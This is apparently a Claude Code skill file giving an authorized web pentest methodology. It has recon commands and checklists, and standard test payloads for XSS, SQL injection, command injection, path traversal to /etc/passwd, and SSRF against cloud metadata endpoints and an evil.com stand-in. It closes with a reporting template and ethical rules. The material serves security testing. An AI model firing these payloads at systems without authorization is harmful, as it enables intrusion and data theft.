---
name: "Penetration Testing Checklist"
description: "Systematic web application penetration testing methodology. Apply when performing authorized security assessments, bug bounty hunting, or pre-deployment security validation. Covers recon, scanning, exploitation, and reporting."
allowed-tools: Read, Write, Edit, Bash, Grep, Glob
version: 2.1.0
compatibility: Claude Opus 4.6, Sonnet 4.6, Claude Code v2.1.x
updated: 2026-03-26
---

# Penetration Testing Checklist

Systematic methodology for authorized web application security testing.

**IMPORTANT:** Only use this skill for authorized security testing — pentesting engagements, bug bounty programs, CTF challenges, or testing your own applications.

## Overview

This skill provides a structured pentest workflow:

1. **Reconnaissance** — Gather information about the target
2. **Scanning** — Identify attack surface and vulnerabilities
3. **Exploitation** — Validate vulnerabilities (with permission)
4. **Post-Exploitation** — Assess impact and lateral movement
5. **Reporting** — Document findings with remediation guidance

## Phase 1: Reconnaissance

### Passive Recon (No direct interaction with target)

```bash
# DNS enumeration
dig +short target.com
dig +short -t MX target.com
dig +short -t TXT target.com

# Subdomain discovery
# Use tools like subfinder, amass, or online services

# Technology fingerprinting (check HTTP headers)
curl -sI https://target.com | grep -iE "(server|x-powered|x-frame|content-security)"

# Check robots.txt and sitemap
curl -s https://target.com/robots.txt
curl -s https://target.com/sitemap.xml
```

### Active Recon (Direct interaction)

```bash
# Port scanning (with authorization)
nmap -sV -sC -oN scan_results.txt target.com

# Web technology detection
# Check response headers, JavaScript libraries, CSS frameworks

# Directory enumeration (with authorization)
# Use wordlists to discover hidden paths and files
```

## Phase 2: Vulnerability Scanning

### Authentication Testing

```markdown
## Auth Checklist
- [ ] Test default credentials (admin/admin, admin/password)
- [ ] Test account enumeration via login error messages
- [ ] Test password reset flow for information disclosure
- [ ] Test session fixation
- [ ] Test session timeout and invalidation on logout
- [ ] Test remember-me functionality
- [ ] Test brute force protections
- [ ] Test MFA bypass techniques
- [ ] Test OAuth/OIDC implementation (state, nonce, redirect_uri)
```

### Input Validation Testing

```markdown
## Injection Checklist
- [ ] SQL injection: ' OR 1=1 --, UNION SELECT, blind timing
- [ ] XSS: <script>alert(1)</script>, event handlers, SVG payloads
- [ ] Command injection: ; id, | whoami, $(command)
- [ ] Template injection: {{7*7}}, ${7*7}, #{7*7}
- [ ] Path traversal: ../../../etc/passwd, ....//....//
- [ ] LDAP injection: )(cn=*), *()|(&)
- [ ] XML injection: XXE payloads if XML parsing exists
- [ ] Header injection: CRLF in headers (%0d%0a)
```

### Access Control Testing

```markdown
## Authorization Checklist
- [ ] IDOR: Change resource IDs to access other users' data
- [ ] Forced browsing: Access admin paths as regular user
- [ ] HTTP method tampering: Try PUT/DELETE on read-only endpoints
- [ ] Parameter manipulation: Modify price, role, quantity parameters
- [ ] JWT testing: Algorithm confusion, expired token reuse, claim tampering
- [ ] API key scope: Test keys against endpoints beyond their scope
- [ ] CORS misconfiguration: Test with different Origin headers
```

### Business Logic Testing

```markdown
## Logic Checklist
- [ ] Price manipulation: Modify prices in client-side requests
- [ ] Quantity manipulation: Negative quantities, zero prices
- [ ] Race conditions: Concurrent requests for one-time operations
- [ ] Workflow bypass: Skip steps in multi-step processes
- [ ] Rate limit bypass: Header rotation, IP rotation
- [ ] Feature abuse: Use features in unintended combinations
```

## Phase 3: Common Vulnerability Tests

### XSS Testing Payloads

```
# Basic reflected XSS
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# Attribute injection
" onfocus="alert(1)" autofocus="
' onfocus='alert(1)' autofocus='

# Filter bypass
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

# DOM-based XSS check points
- URL fragments (#)
- document.location
- document.referrer
- window.name
- postMessage handlers
```

### SQL Injection Testing

```
# Error-based detection
' --
' OR '1'='1
' UNION SELECT NULL--

# Blind boolean-based
' AND 1=1--  (true - normal response)
' AND 1=2--  (false - different response)

# Time-based blind
' AND SLEEP(5)--
' AND pg_sleep(5)--

# UNION-based enumeration
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

### SSRF Testing

```
# Internal network access
http://127.0.0.1/
http://localhost/
http://[::1]/
http://0.0.0.0/

# Cloud metadata endpoints
http://169.254.169.254/latest/meta-data/  (AWS)
http://metadata.google.internal/  (GCP)
http://169.254.169.254/metadata/  (Azure)

# URL parser confusion
http://127.0.0.1@evil.com
http://evil.com#@127.0.0.1
```

## Phase 4: Reporting

### Finding Template

```markdown
## Finding: [Vulnerability Title]

**Severity:** Critical / High / Medium / Low / Informational
**CVSS Score:** X.X
**CWE:** CWE-XXX
**OWASP:** A0X:2025

### Description
[What the vulnerability is and why it matters]

### Steps to Reproduce
1. Navigate to [URL]
2. Enter [payload] in [field]
3. Observe [result]

### Proof of Concept
[Screenshot, HTTP request/response, or code snippet]

### Impact
[What an attacker could do — data access, account takeover, etc.]

### Remediation
[Specific fix with code example]

### References
- [OWASP reference]
- [CWE reference]
```

### Severity Classification

| Severity | Criteria | Examples |
|----------|----------|---------|
| **Critical** | Full system compromise, mass data breach | RCE, SQL injection with admin access, auth bypass |
| **High** | Significant data access or privilege escalation | Stored XSS, IDOR with PII, SSRF to internal services |
| **Medium** | Limited data access or user impact | Reflected XSS, CSRF, information disclosure |
| **Low** | Minimal direct impact | Verbose errors, missing headers, clickjacking |
| **Info** | Best practice recommendations | Outdated TLS, missing HSTS preload |

## Tools Reference

| Category | Tools |
|----------|-------|
| **Recon** | subfinder, amass, dig, whois, shodan |
| **Scanning** | nmap, nikto, nuclei, wappalyzer |
| **Proxy** | Burp Suite, OWASP ZAP, mitmproxy |
| **Exploitation** | sqlmap (authorized only), XSS Hunter |
| **Fuzzing** | ffuf, wfuzz, dirsearch |
| **Reporting** | Markdown templates, Dradis, PlexTrac |

## Ethical Guidelines

1. **Authorization required** — Always have written permission before testing
2. **Scope adherence** — Only test systems within the defined scope
3. **Data handling** — Never exfiltrate or store production data
4. **Responsible disclosure** — Report findings through proper channels
5. **Minimal impact** — Avoid DoS, data destruction, or service disruption
6. **Documentation** — Log all testing activities with timestamps

## Sources

- [OWASP Testing Guide v5](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Top 10:2025](https://owasp.org/Top10/)
- [PTES (Penetration Testing Execution Standard)](http://www.pentest-standard.org/)
- [HackerOne Vulnerability Taxonomy](https://www.hackerone.com/vulnerability-management/vulnerability-taxonomy)
- [NIST SP 800-115 Technical Guide to Testing](https://csrc.nist.gov/publications/detail/sp/800-115/final)
